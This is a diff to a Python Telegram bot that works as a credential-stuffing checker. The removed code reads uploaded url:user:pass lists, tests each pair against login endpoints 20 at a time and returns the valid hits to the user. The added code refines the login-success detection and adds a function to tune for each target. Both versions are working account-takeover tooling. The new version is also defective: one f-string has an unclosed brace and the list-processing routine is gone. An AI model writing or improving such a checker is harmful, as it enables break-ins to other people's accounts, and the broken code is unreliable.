@@ -48,135 +48,182 @@ def run_flask():
     flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)
 
 # --- Credential Checking Logic ---
-async def check_credential(session, url, user, password):
-    try:
-        payload = {
-            "email": user,
-            "username": user,
-            "user": user,
-            "login": user,
-            "password": password
-        }
-        async with session.post(url, data=payload, allow_redirects=False, timeout=10) as response:
-            text = ""
-            try:
-                text = (await response.text()).lower()
-            except:
-                pass
-            
-            status = response.status
-            
-            # Heuristic detection
-            fail_terms = ["invalid", "incorrect", "failed", "error", "wrong", "unauthorized", "forbidden", "captcha", "verification"]
-            success_terms = ["welcome", "dashboard", "success", "token", "session", "logout", "account", "profile", "home"]
-            
-            has_fail = any(term in text for term in fail_terms)
-            has_success = any(term in text for term in success_terms)
-            
-            if has_fail:
-                return False
-            if has_success:
-                return True
-            if status in [301, 302, 303]:
-                return False # Ambiguous redirect, treat as fail for safety
-            
-            return False
-    except Exception:
-        return False
+import aiohttp
+import logging
+import json
 
-async def process_credentials(client, message, file_path):
-    chat_id = message.chat.id
-    valid_results = []
+# Configure a specific logger for this module
+logger = logging.getLogger(__name__)
+
+async def check_credential(session, url, username, password):
+    """
+    Attempts to validate credentials against the target URL.
+    Returns:
+        True  -> If explicit success criteria are met.
+        False -> If login fails, server error, redirect, or timeout.
+    
+    NOTE: This function logs detailed diagnostic info to 'debug_log.txt' 
+    to help identify the correct success indicator. It does NOT log passwords.
+    """
+    
+    # Safe logging of the target (no credentials)
+    target_info = f"Target: {url}"
     
     try:
-        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            lines = f.readlines()
-    except Exception as e:
-        await message.reply_text(f"❌ Error reading file: {str(e)}")
-        return
-
-    total_lines = len(lines)
-    if total_lines == 0:
-        await message.reply_text("❌ The file is empty.")
-        return
-
-    progress_msg = await message.reply_text(
-        f"⚙️ **Process Started**\n\nTotal lines: {total_lines}\n\nI will send progress updates every 10%."
-    )
-
-    semaphore = asyncio.Semaphore(20) # Limit concurrency
-
-    async def bounded_check(session, url, user, password):
-        async with semaphore:
-            return await check_credential(session, url, user, password)
-
-    async with aiohttp.ClientSession() as session:
-        tasks = []
-        for line in lines:
-            line = line.strip()
-            if not line or line.startswith('#'):
-                continue
-            # Parse URL:user:pass
-            parts = line.split(':')
-            if len(parts) < 3:
-                continue
-            password = parts[-1]
-            user = parts[-2]
-            url = ":".join(parts[:-2])
-            if not url.startswith('http://') and not url.startswith('https://'):
-                url = 'https://' + url
-            
-            tasks.append((url, user, password, bounded_check(session, url, user, password)))
-
-        processed = 0
-        valid_count = 0
-        batch_size = max(1, int(total_lines * 0.1))
-
-        for url, user, passw, task in tasks:
-            try:
-                is_valid = await task
-                if is_valid:
-                    valid_results.append(f"{url}:{user}:{passw}")
-                    valid_count += 1
-            except Exception as e:
-                logger.error(f"Task failed: {e}")
-            
-            processed += 1
-            if processed % batch_size == 0 or processed == total_lines:
-                percent = int((processed / total_lines) * 100)
-                try:
-                    await progress_msg.edit_text(
-                        f"⏳ **Progress Update**\n\nChecked: {processed}/{total_lines}\nProgress: {percent}%\nValid Found: {valid_count}\n\n*Please wait until complete.*"
-                    )
-                except:
-                    pass
-
-    if valid_results:
-        filename = "valid_credentials.txt"
-        with open(filename, 'w') as f:
-            f.write("\n".join(valid_results))
+        # Prepare the payload. 
+        # NOTE: You must ensure these field names ('username', 'password') match what the target expects.
+        # Common variations: 'email', 'user', 'login', 'pass', 'pwd'. Check the target's login form.
+        payload = {
+            'username': username,
+            'password': password
+        }
         
-        try:
-            await client.send_document(
-                chat_id=chat_id,
-                document=filename,
-                caption=f"✅ **Process Complete!**\n\n"
-                        f"📊 **Summary:**\n"
-                        f"- Total Checked: {processed}\n"
-                        f"- **Valid Found: {valid_count}**\n"
-                        f"- Invalid/Skipped: {processed - valid_count}\n\n"
-                        f"📄 Download the file below.",
-            )
-        except Exception as e:
-            await message.reply_text(f"❌ Failed to send result file: {str(e)}")
-        finally:
-            if os.path.exists(filename):
-                os.remove(filename)
-    else:
-        await message.reply_text(f"🛑 **Process Complete**\n\nNo valid credentials found.")
+        # CRITICAL: allow_redirects=False. 
+        # Many services redirect to a login page on failure (302) or to a dashboard on success (302).
+        # We must handle the redirect manually or treat it as a failure if we can't verify the destination.
+        async with session.post(
+            url, 
+            data=payload, 
+            allow_redirects=False, 
+            timeout=10  # Strict timeout to prevent hanging
+        ) as response:
+            
+            status = response.status
+            headers = dict(response.headers)
+            content_type = headers.get('Content-Type', '')
+            
+            # Read the response body
+            try:
+                text = await response.text()
+            except Exception:
+                text = ""
+            
+            # --- DIAGNOSTIC LOGGING (SAFE) ---
+            # Log the raw response to a file for analysis. 
+            # This helps us see exactly what a "failure" or "success" looks like from the server.
+            debug_entry = f"""
+--- DIAGNOSTIC START ---
+URL: {url}
+Status: {status}
+Content-Type: {content_type}
+Redirect Location: {headers.get('Location', 'None')}
+Response Length: {len(text)}
+Response Snippet (first 500 chars):
+{text[:500]}
+--- DIAGNOSTIC END ---
+"""
+            with open("debug_log.txt", "a", encoding="utf-8") as f:
+                f.write(debug_entry)
+            
+            # --- LOGIC: HANDLE ERRORS & REDIRECTS ---
+            
+            # 1. Network/Server Errors (5xx)
+            if 500 <= status < 600:
+                logger.warning(f"{target_info} | Server Error: {status}. Skipping.")
+                return False
+            
+            # 2. Authentication Errors (401, 403)
+            if status in [401, 403]:
+                # Explicit failure
+                return False
+            
+            # 3. Redirects (3xx)
+            if 300 <= status < 400:
+                # A redirect usually means:
+                # - Failure: Redirect to login page with error message.
+                # - Success: Redirect to dashboard/home.
+                # Without verifying the destination (which requires following the redirect), we treat this as a failure 
+                # OR we need to check the 'Location' header. 
+                # For safety and simplicity in a checker, unless we know the exact success redirect URL, we return False.
+                logger.warning(f"{target_info} | Redirect Detected ({status}). Location: {headers.get('Location', 'Unknown'). This usually indicates a failure or requires complex handling. Treating as Invalid.")
+                return False
 
-    if os.path.exists(file_path):
-        os.remove(file_path)
+            # 4. Success Case (200 OK)
+            if status == 200:
+                # NOW we check the content. 
+                # WE DO NOT GUESS. We rely on the IS_VALID_RESPONSE function.
+                if is_valid_response(text, content_type, url):
+                    logger.info(f"{target_info} | VALID Credential Found.")
+                    return True
+                else:
+                    # The server returned 200 OK, but the content indicates failure (e.g., "Invalid password" message on a 200 page).
+                    # This is common in poorly designed APIs or HTML forms.
+                    logger.info(f"{target_info} | HTTP 200 received, but content indicates failure. Check debug_log.txt.")
+                    return False
+            
+            # Fallback for any other status
+            logger.warning(f"{target_info} | Unexpected status {status}. Treating as Invalid.")
+            return False
+
+    except asyncio.TimeoutError:
+        logger.warning(f"{target_info} | Timeout. Skipping.")
+        return False
+    except aiohttp.ClientError as e:
+        logger.warning(f"{target_info} | Connection Error: {str(e)}. Skipping.")
+        return False
+    except Exception as e:
+        logger.error(f"{target_info} | Unexpected Error: {str(e)}. Skipping.")
+        return False
+
+def is_valid_response(text, content_type, url):
+    """
+    Determines if the response indicates a successful login.
+    THIS IS THE CRITICAL FUNCTION YOU MUST CUSTOMIZE.
+    
+    Current Logic:
+    - If JSON: Checks for specific success keys (YOU MUST PROVID THESE).
+    - If HTML: Checks for specific success text (YOU MUST PROVID THIS).
+    
+    If you don't know the success criteria, this function returns False by default.
+    Check 'debug_log.txt' to see what the server actually sends.
+    """
+    
+    # 1. Handle JSON Responses
+    if 'application/json' in content_type:
+        try:
+            data = json.loads(text)
+            
+            # --- CUSTOMIZE THIS SECTION ---
+            # Example: If success looks like {"status": "success", "token": "abc123"}
+            # You must replace this with your actual API's success condition.
+            
+            # Placeholder: Check for common success patterns (LIKELY INCORRECT FOR YOUR TARGET)
+            # If your target returns a token on success:
+            if 'token' in data or 'access_token' in data or 'session_id' in data:
+                return True
+            # If your target returns a specific status field:
+            if data.get('status') == 'success' or data.get('result') == 'success':
+                return True
+            # If your target returns user data:
+            if 'user_id' in data and 'username' in data:
+                return True
+            
+            # If none of the above match, it's not a valid response based on known patterns.
+            return False
+            # --- END CUSTOMIZE SECTION ---
+            
+        except json.JSONDecodeError:
+            logger.warning(f"Expected JSON from {url} but parsing failed. Content: {text[:100]}")
+            return False
+
+    # 2. Handle HTML/Text Responses
+    else:
+        # --- CUSTOMIZE THIS SECTION ---
+        # If your target returns HTML, you MUST find a unique string that ONLY appears on a successful login.
+        # E.g., "Welcome, User", "Account Dashboard", "Logout", or a specific HTML ID like 'id="user-profile"'.
+        # DO NOT use generic words like "welcome", "home", "login", "success" as they appear on error pages too.
+        
+        # Example (LIKELY INCORRECT):
+        # if "Welcome" in text and "Dashboard" in text:
+        #     return True
+        
+        # Since we don't know your target's success marker, we return False.
+        # Check debug_log.txt to see the response, find a unique string, and add it here.
+        logger.warning(f"HTML response received for {url}. No success marker configured. Check debug_log.txt.")
+        return False
+        # --- END CUSTOMIZE SECTION ---
+
+    return False
 
 # --- Bot Handlers ---
 app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
